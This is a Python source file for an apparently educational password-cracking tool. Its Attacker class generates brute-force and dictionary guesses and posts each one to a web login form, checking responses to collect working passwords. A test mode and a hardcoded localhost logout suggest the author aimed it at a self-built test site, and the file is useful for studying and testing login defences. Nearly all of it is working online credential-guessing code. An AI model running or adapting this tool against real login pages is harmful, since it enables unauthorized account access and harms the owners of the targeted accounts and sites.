from PasswordCracker.PasswordAttackTypes import BruteForceAttack, DictionaryAttack
import requests


class Attacker():
    def __init__(self, loginURL, logoutURL, testMode=True, verbose=False, formTags=["Username", "Password"],
                 attackMethods={"BruteForceAttack":BruteForceAttack(), "DictionaryAttack":DictionaryAttack()}):

        # url of the login page
        self.loginURL = loginURL

        self.logoutURL = logoutURL

        # test mode doesn't send the login requests, just gets the passwords
        self.testMode = testMode

        # prints EVERYTHING out.
        self.verbose = verbose

        # Layout of the login form. You can check this through inspect element. Or if you built the website you can check the code!
        self.formTags = formTags

        # By default this is set to:
        # {
        #   "Username" : "username",
        #   "Password" : "password",
        # }
        self.data = {
            formTags[0] : None, # form id for username
            formTags[1] : None # form id for password
        }

        # list of attack methods
        # You can write your own class but it must contain a generatePasswords() method that returns a list of password guesses
        self.attackMethods = attackMethods

    # runs attack on the website.
    # successful is a function that the user provides that returns whether the login succeeded or not.
    # def successful(response) -> Boolean
    # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
    def runAttack(self, checkSuccess, attackMethods=None, username=None, findAll=False):
        print("ATTACKING", self.loginURL)

        # stores password've we cracked
        foundPasswords = set({})

        # can specify which attack methods to use
        # if not specified, use all that are loaded in
        if not attackMethods:
            attackMethods = [name for name in self.attackMethods]

        with requests.Session() as session:


            for name, attackMethod in self.attackMethods.items():

                if name not in attackMethods:
                    continue

                print("===========================================================================\n" + str(attackMethod))

                n = 0
                for password in attackMethod.generatePasswords():
                    n += 1
                    if self.testMode:
                        if self.verbose:
                            print("TEST MODE: generated password [%s]" % password)
                        continue

                    # if username is not passed as argument, we will user the password as our username
                    self.setDataFields(username, password)

                    response = session.post(self.loginURL, data=self.data)
                    found = checkSuccess(response)

                    if self.verbose:
                        print("Trying [%s] ... %s" % (password, "SUCCESS" if found else "FAILED"))

                    if found:
                        foundPasswords.add(password)

                        # if we are just brute forcing a single username exit after we found it
                        if not findAll:
                            break



                    session.get("http://127.0.0.1:5000/logout")

                print("%s generated %d passwords. Found %d password:" % (name, n, len(foundPasswords)))
                for pw in foundPasswords:
                    print(pw)

                print("===========================================================================\n")

        return foundPasswords

    def setDataFields(self, username, password):
        self.data[self.formTags[0]] = username or password
        self.data[self.formTags[1]] = password

    def getPasswords(self):
        result = []
        for attackMethod in self.attackMethods:
            print(attackMethod)
            result += attackMethod.generatePasswords()

        return result

    def addAttackMethod(self, method):
        self.attackMethods[type(method).__name__] = method

    def getAttackMethod(self, method):
        if method in self.attackMethods:
            return self.attackMethods[method]

